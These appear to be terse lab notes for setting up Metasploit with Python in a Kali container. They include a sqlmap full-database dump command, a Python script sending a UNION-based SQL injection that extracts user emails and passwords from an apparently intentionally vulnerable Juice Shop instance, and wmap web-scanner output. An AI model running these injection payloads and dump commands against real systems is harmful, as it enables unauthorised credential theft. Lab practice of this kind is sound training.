Metasploit + Python Setup


docker run -t -i kalilinux/kali-linux-docker /bin/bash
apt-get update && apt-get install metasploit-framework
apt-get install python3-pip
pip3 install --user pymetasploit3

msfrpcd -P changeme123 -S
(opens port on 55553)

service postgresql start
(starts postgresql service)

msfdb init
(connects metasploit with postgresql)

git clone https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
cd sqlmap-dev
python3.7 sqlmap.py -u 'http://juice-shop-charles/rest/product/search?q=something' -p 'q' --dbms='sqlite' --level=3 --risk=3 --dump-all --technique U --union-cols 8 --fresh-queries --flush-session --union-char='x' --batch
(scan with sqlmap)
(do get request with proper parameters)
import requests

url = "http://juice-shop-charles.us-west1-a.securethebox.us/rest/product/search/"

querystring = {"q":"something%27%29%29%20UNION%20ALL%20SELECT%20NULL,email,password,NULL,NULL,NULL,NULL,NULL%20from%20users--%0A"}

headers = {
    'User-Agent': "PostmanRuntime/7.13.0",
    'Accept': "*/*",
    'Host': "juice-shop-charles.us-west1-a.securethebox.us",
    'accept-encoding': "gzip, deflate",
    'Connection': "keep-alive"
    }

response = requests.request("GET", url, headers=headers, params=querystring)

print(response.text)







load wmap
wmap_sites -a http://nginx-modsecurity-charles
wmap_run -t

[*] Module auxiliary/scanner/http/http_version
[*] Module auxiliary/scanner/http/frontpage_login
[*] Module auxiliary/scanner/http/host_header_injection
[*] Module auxiliary/scanner/http/options
[*] Module auxiliary/scanner/http/robots_txt
[*] Module auxiliary/scanner/http/scraper
[*] Module auxiliary/scanner/http/svn_scanner
[*] Module auxiliary/scanner/http/trace
[*] Module auxiliary/scanner/http/vhost_scanner
[*] Module auxiliary/scanner/http/webdav_internal_ip
[*] Module auxiliary/scanner/http/webdav_scanner
[*] Module auxiliary/scanner/http/webdav_website_content
[*] 
=[ File/Dir testing ]=
============================================================
[*] Module auxiliary/scanner/http/backup_file
[*] Module auxiliary/scanner/http/brute_dirs
[*] Module auxiliary/scanner/http/copy_of_file
[*] Module auxiliary/scanner/http/dir_listing
[*] Module auxiliary/scanner/http/dir_scanner
[*] Module auxiliary/scanner/http/dir_webdav_unicode_bypass
[*] Module auxiliary/scanner/http/file_same_name_dir
[*] Module auxiliary/scanner/http/files_dir
[*] Module auxiliary/scanner/http/http_put
[*] Module auxiliary/scanner/http/prev_dir_same_name_file
[*] Module auxiliary/scanner/http/replace_ext
[*] Module auxiliary/scanner/http/soap_xml
[*] Module auxiliary/scanner/http/trace_axd
[*] Module auxiliary/scanner/http/verb_auth_bypass
[*] 
=[ Unique Query testing ]=
============================================================
[*] Module auxiliary/scanner/http/blind_sql_query
[*] Module auxiliary/scanner/http/error_sql_injection
[*] Module auxiliary/scanner/http/http_traversal